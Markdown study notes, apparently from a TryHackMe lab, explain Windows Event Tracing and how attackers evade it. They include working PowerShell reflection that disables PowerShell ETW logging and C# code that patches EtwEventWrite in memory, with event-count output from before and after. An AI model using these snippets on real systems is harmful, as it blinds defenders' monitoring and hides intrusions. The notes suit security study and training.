# Evading Logging and Monitoring

* Unlike anti-virus and EDR (Endpoint Detection and Response) solutions, logging creates a physical record of activity that can be analyzed for malicious activity.
* Once logs are created, they can be kept on the device or sent to an event collector/forwarder.
* Once they are off the device, the defense team decides how to aggregate them
* Generally accomplished using an indexer and a SIEM (Security Information and Event Manager).
* The primary target for an attacker is the event logs, managed and controlled by ETW (Event Tracing for Windows).

## Event Tracing

* ETW handles almost all event logging at both the application and kernel level
* Event Ids are a core feature of Windows Logging
* Events are sent and transferred in ZML format

### Extensions of ETW

* Component --> Purpose

```
Controllers -->	Build and configure sessions
Providers	--> Generate events
Consumers	--> Interpret events
```

* Example of Event Id `4624` `An account was successfully logged on`

```
Event ID:4624
Source:Security
Category:Logon/Logoff
Message:An account was successfully logged on.

Subject:
Security ID: NT AUTHORITY\\SYSTEM
Account Name: WORKSTATION123$
...
[ snip ]
...
Logon Type: 7

New Logon:
Security ID: CORPDOMAIN\\john.doe
Account Name: john.doe
...
[ snip ]
...
Process Information:
Process ID: 0x314
```

## Approaches to Log Evasion

* Common event IDs to avoid causing

```
Event ID	Purpose
1102 --> Logs when the Windows Security audit log was cleared
104 --> Logs when the log file was cleared
1100 --> Logs when the Windows Event Log service was shut down
```

* The above event IDs can monitor the process of destroying logs or “log smashing.

## Tracing Instrumentation

* ETW is broken up into three separate components
* Event Controllers are used to build and configure sessions.
* We can think of the controller as the application that determines how and where data will flow.
* Event Providers are used to generate events.
* The controller will tell the provider how to operate, then collect logs from its designated source
* There are also four different types of providers with support for various functions and legacy systems.

```
MOF (Managed Object Format) 
Defines events from MOF classes. Enabled by one trace session at a time.
```

```
WPP (Windows Software Trace Preprocessor) 
Associated with TMF(Trace Message Format) files to decode information. Enabled by one trace session at a time.
```

```
Manifest-Based 
Defines events from a manifest. Enabled by up to eight trace sessions at a time.
```

```
TraceLogging
Self-describing events containing all required information. Enabled by up to eight trace sessions at a time.
```

* Event Consumers are used to interpret events.
* The consumer will select sessions and parse events from that session or multiple at the same time.
* This is most commonly seen in the `“Event Viewer”`.
* ![image](https://user-images.githubusercontent.com/75596877/171702263-525e4588-6213-4e19-a749-92e33a0678d4.png)

### Overall Process

* Events originate from the providers.
* Controllers will determine where the data is sent and how it is processed through sessions.
* Consumers will save or deliver logs to be interpreted or analyzed.

## Reflection for Fun and Silence

* Within PowerShell, ETW providers are loaded into the session from a .NET assembly: `PSEtwLogProvider`
* In a PowerShell session, most .NET assemblies are loaded in the same security context as the user at startup
* In the context of ETW (Event Tracing for Windows), an attacker can reflect the ETW event provider assembly and set the field `m_enabled` to `$null`.
* At a high level, PowerShell reflection can be broken up into four steps: Obtain .NET assembly for PSEtwLogProvider. Store a null value for etwProvider field. Set the field for m\_enabled to previously stored value. At step one, we need to obtain the type for the PSEtwLogProvider assembly. The assembly is stored in order to access its internal fields in the next step.

```
$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
```

* At step two, we are storing a value ($null) from the previous assembly to be used.

```
$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
```

* At step three, we compile our steps together to overwrite the `m_enabled` field with the value stored in the previous line.

```
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
```

* We can compile these steps together and append them to a malicious PowerShell script. Use the PowerShell script provided and experiment with this technique.
* To prove the efficacy of the script, we can execute it and measure the number of returned events from a given command.

### Before

```
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
7
PS C:\Users\Administrator> whoami
Tryhackme\administrator
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
11
```

### After

```
PS C:\Users\Administrator>.\reflection.ps1
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
18
PS C:\Users\Administrator> whoami
Tryhackme\administrator
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
18
```

## Patching Tracing Function

* ETW is loaded from the runtime of every new process, commonly originating from the CLR (Common Language Runtime).
* Within a new process, ETW events are sent from the userland and issued directly from the current process.
* An attacker can write pre-defined opcodes to an in-memory function of ETW to patch and disable functionality.
* High Level POC

```
int x = 1
int y = 3
return x + y

// output: 4  
-------------------------
int x = 1
return  x
int y = 3
return x + y

// output: 1  
```

* We know that from the CLR, ETW is written from the function `EtwEventWrite`. To identify “patch points” or returns, we can view the disassembly of the function.

```
779f2459 33cc		       xor	ecx, esp
779f245b e8501a0100	   call	ntdll!_security_check_cookie
779f2460 8be5		       mov	esp, ebp
779f2462 5d		         pop	ebp
779f2463 c21400		     ret	14h 
```

* `ret 14h` will end the function and return to the previous application.
* The parameter of ret (`14h`) will specify the number of bytes or words released once the stack is popped.
* To neuter the function, an attacker can write the opcode bytes of `ret14h, c21400` to memory to patch the function. ![52fd846d5fa1e76948ac47d563ad6228](https://user-images.githubusercontent.com/75596877/172450790-cb56c592-7cc1-4dba-ad31-9bec8a76b615.png)
* At a high level, ETW patching can be broken up into five steps:

### Steps for ETW

* Obtain a handle for `EtwEventWrite`
* Modify memory permissions of the function
* Write opcode bytes to memory
* Reset memory permissions of the function (optional)
* Flush the instruction cache (optional)
* At step one, we need to obtain a handle for the address of `EtwEventWrite`. This function is stored within `ntdll`. We will first load the library using `LoadLibrary` then obtain the handle using `GetProcAddress`.

```
var ntdll = Win32.LoadLibrary("ntdll.dll");
var etwFunction = Win32.GetProcAddress(ntdll, "EtwEventWrite");
```

* At step two, we need to modify the memory permissions of the function to allow us to write to the function. The permission of the function is defined by the `flNewProtect` parameter; `0x40` enables X, R, or RW access (memory protection constraints).

```
uint oldProtect;
Win32.VirtualProtect(
	etwFunction, 
	(UIntPtr)patch.Length, 
	0x40, 
	out oldProtect
);
```

* At step three, the function has the permissions we need to write to it, and we have the pre-defined opcode to patch it.
* Because we are writing to a function and not a process, we can use the infamous `Marshal.Copy` to write our opcode.

```
patch(new byte[] { 0xc2, 0x14, 0x00 });
Marshal.Copy(
	patch, 
	0, 
	etwEventSend, 
	patch.Length
);
```

* At step four, we can begin cleaning our steps to restore memory permissions as they were.

```
VirtualProtect(etwFunction, 4, oldProtect, &oldOldProtect);
At step five, we can ensure the patched function will be executed from the instruction cache.

Win32.FlushInstructionCache(
	etwFunction,
	NULL
);
```

* We can compile these steps together and append them to a malicious script or session. Use the C# script provided and experiment with this technique.
* After the opcode is written to memory, we can view the disassembled function again to observe the patch.

```
779f23c0 c21400		    ret	14h
779f23c3 00ec		      add	ah, ch
779f23c5 83e4f8		    and	esp, 0FFFFFFF8h
779f23c8 81ece0000000	sub	esp, 0E0h
```

* In the above disassembly, we see exactly what we depicted in our LIFO diagram (figure 2).
* Once the function is patched in memory, it will always return when `EtwEventWrite` is called.
* Although this is a beautifully crafted technique, it might not be the best approach depending on your environment since it may restrict more logs than you want for integrity.

## Providers via Policy
